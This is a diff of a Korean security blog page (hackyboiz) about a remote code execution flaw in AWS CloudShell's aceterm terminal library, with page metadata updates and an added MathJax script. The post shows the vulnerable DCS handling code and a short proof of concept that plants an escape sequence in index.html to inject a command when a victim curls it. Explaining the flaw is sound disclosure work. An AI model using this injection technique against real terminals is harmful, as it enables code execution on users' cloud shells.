@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      168 자
+      318 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      6
        분
     </span>
   
@@ -244,20 +244,20 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>Dell Windows device</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AWS Management Console에서 사용 가능한 브라우저 기반 쉘인 AWS CloudShell에서 원격 코드 실행 취약점이 발견되어 세부 정보가 공개되었습니다.</p>
-<p>취약점은 AWS CloudShell의 <code>aceterm</code> 라이브러리에서 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://xtermjs.org/docs/api/vtfeatures/">DCS(Device Control String)</a> 이스케이프 문자를 처리하는 과정에 존재합니다. </p>
-<pre><code class="hljs python">case <span class="hljs-string">&#x27;+q&#x27;</span>:
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AWS Management Console&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xAE30;&#xBC18; &#xC258;&#xC778; AWS CloudShell&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xCDE8;&#xC57D;&#xC810;&#xC740; AWS CloudShell&#xC758; <code>aceterm</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://xtermjs.org/docs/api/vtfeatures/">DCS(Device Control String)</a> &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xBB38;&#xC790;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p>
+<pre><code class="hljs python">case <span class="hljs-string">&apos;+q&apos;</span>:
 	var pt = this.currentParam
 	, valid = false;
 
-	this.send(<span class="hljs-string">&#x27;\x1bP&#x27;</span> + +valid + <span class="hljs-string">&#x27;+r&#x27;</span> + pt + <span class="hljs-string">&#x27;\x1b\\&#x27;</span>);
+	this.send(<span class="hljs-string">&apos;\x1bP&apos;</span> + +valid + <span class="hljs-string">&apos;+r&apos;</span> + pt + <span class="hljs-string">&apos;\x1b\\&apos;</span>);
 	<span class="hljs-keyword">break</span>;</code></pre>
 
-<p><code>echo -ne &#39;\eP+q6b64\e\\&#39;</code> 을 입력하는 경우 위 코드에서 다음과 같이 처리됩니다. <code>this.currenParam</code>은 <code>\eP+q</code> 이스케이프 문자 뒤에 오는 임의의 문자열을 포함하며 <code>this.send()</code>에서 이를 터미널 입력 핸들러로 전달하는데, 이때 개행을 포함한 임의 코드를 삽입할 수 있습니다.</p>
-<p>이를 악용한 해커가 타겟의 AWS 인스턴스에 <code>/tmp/foo</code> 파일을 생성하는 PoC는 다음과 같습니다.</p>
+<p><code>echo -ne &apos;\eP+q6b64\e\\&apos;</code> &#xC744; &#xC785;&#xB825;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. <code>this.currenParam</code>&#xC740; <code>\eP+q</code> &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xBB38;&#xC790; &#xB4A4;&#xC5D0; &#xC624;&#xB294; &#xC784;&#xC758;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xBA70; <code>this.send()</code>&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xD130;&#xBBF8;&#xB110; &#xC785;&#xB825; &#xD578;&#xB4E4;&#xB7EC;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xAC1C;&#xD589;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD55C; &#xD574;&#xCEE4;&#xAC00; &#xD0C0;&#xAC9F;&#xC758; AWS &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; <code>/tmp/foo</code> &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; PoC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python">$ echo -e <span class="hljs-string">&quot;echo -ne &quot;</span>abcdef\x1bP+q\ntouch /tmp/foo\n\x1b\n<span class="hljs-string">&quot;&quot;</span> &gt; index.html</code></pre>
 
-<p>타겟 AWS CloudShell에서 해커의 <code>index.html</code>을 curl 등의 툴로 액세스 하면 취약점이 트리거 되어 원격 코드 실행이 가능합니다.</p>
+<p>&#xD0C0;&#xAC9F; AWS CloudShell&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xC758; <code>index.html</code>&#xC744; curl &#xB4F1;&#xC758; &#xD234;&#xB85C; &#xC561;&#xC138;&#xC2A4; &#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC5B4; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 
             </div>
             <hr>
@@ -560,6 +560,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
